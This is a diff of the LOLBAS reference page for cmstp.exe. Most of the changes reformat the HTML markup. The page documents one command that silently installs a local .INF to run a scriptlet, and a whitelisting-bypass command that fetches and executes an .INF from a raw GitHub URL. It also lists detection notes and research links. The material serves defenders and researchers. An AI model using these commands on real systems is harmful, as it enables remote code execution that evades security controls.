@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Cmstp/#execute">Execute</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Cmstp/#awl bypass">AWL bypass</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Cmstp/#execute">Execute</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Cmstp/#awl bypass">AWL bypass</a></li>
+	
 </ul>
 
+	
+
 <p>Installs or removes a Connection Manager service profile.</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,104 +57,90 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/NickTyrer/status/958450014111633408">https://twitter.com/NickTyrer/status/958450014111633408</a></li>
+	<a href="https://twitter.com/NickTyrer/status/958450014111633408">https://twitter.com/NickTyrer/status/958450014111633408</a>
+	<br>
 	
-	<li><a href="https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80">https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80</a></li>
+	<a href="https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80">https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80</a>
+	<br>
 	
-	<li><a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a></li>
+	<a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a>
+	<br>
 	
-	<li><a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/">https://oddvar.moe/2017/08/15/research-on-cmstp-exe/</a></li>
+	<a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/">https://oddvar.moe/2017/08/15/research-on-cmstp-exe/</a>
+	<br>
 	
-	<li><a href="https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1">https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1</a></li>
+	<a href="https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1">https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1</a>
+	<br>
 	
-	<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp</a></li>
+	<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	
-	<li>Nick Tyrer - <a href="https://twitter.com/@NickTyrer">@NickTyrer</a </li>
+	Nick Tyrer - <a href="https://twitter.com/@NickTyrer">@NickTyrer</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>Execution of cmstp.exe should not be normal unless VPN is in use</li>
+	Execution of cmstp.exe should not be normal unless VPN is in use
+	<br>
 	
-	<li>Cmstp.exe communication towards internet and getting files</li>
+	Cmstp.exe communication towards internet and getting files
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
+		<br>
+		<pre><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code></pre>
 		Usecase:Execute code hidden within an inf file. Download and run scriptlets from internet.
-        <pre><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1191">T1191</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1191">T1191</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="awl bypass" class="function-name">AWL bypass</h2>
-
-<p>The LOLBAS can bypass application whitelisting solutions.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.</p>
-
+	
+<h2 id="awl bypass" class ="function-name">AWL bypass</h2>
+	
+		Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
+		<br>
+		<pre><code>cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf</code></pre>
 		Usecase:Execute code hidden within an inf file. Execute code directly from Internet.
-        <pre><code>cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1191">T1191</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1191">T1191</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
